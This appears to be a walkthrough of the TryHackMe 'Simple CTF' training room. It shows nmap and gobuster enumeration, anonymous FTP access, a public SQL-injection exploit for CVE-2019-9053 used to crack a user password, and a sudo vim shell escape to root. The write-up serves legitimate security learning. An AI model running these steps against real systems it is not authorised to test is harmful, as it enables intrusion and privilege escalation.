---
title: "TryHackMe: Simple CTF"
date: 2026-06-15
description: "Walkthrough of the Simple CTF room — enumeration, FTP, SSH privilege escalation."
tags: ["tryhackme", "ctf", "linux", "privesc"]
---

## Overview

**Room:** Simple CTF  
**Difficulty:** Easy  
**Platform:** TryHackMe  

---

## Enumeration

Started with an nmap scan to identify open ports:

```bash
nmap -sV -sC -oN nmap_initial.txt 10.10.x.x
```

**Results:**
- Port 21 — FTP (vsftpd 3.0.3) — anonymous login allowed
- Port 80 — HTTP (Apache 2.4.18)
- Port 2222 — SSH (OpenSSH 7.2p2)

---

## FTP Enumeration

Anonymous FTP login revealed a file:

```bash
ftp 10.10.x.x
# Login: anonymous / anonymous
ls -la
get ForMitch.txt
```

Contents of `ForMitch.txt` hinted at a weak password for user `mitch`.

---

## Web Enumeration

```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Found `/simple` — running **CMS Made Simple 2.2.8**, vulnerable to **CVE-2019-9053** (SQL injection).

---

## Exploitation

Used the public exploit to extract credentials:

```bash
python3 exploit.py -u http://10.10.x.x/simple --crack -w /usr/share/wordlists/rockyou.txt
```

Retrieved: `mitch:secret`

---

## SSH Access & Privilege Escalation

```bash
ssh mitch@10.10.x.x -p 2222
sudo -l
# (root) NOPASSWD: /usr/bin/vim
```

Used vim GTFOBins escape:

```bash
sudo vim -c ':!/bin/bash'
```

Got root. 🎯

---

## Flags

| Flag | Value |
|---|---|
| User | `THM{REDACTED}` |
| Root | `THM{REDACTED}` |

---

## Key Takeaways

- Always check for anonymous FTP — it leaks info more than you'd expect
- CMS version disclosure leads straight to CVE lookup
- `sudo -l` is always the first privesc check on Linux boxes
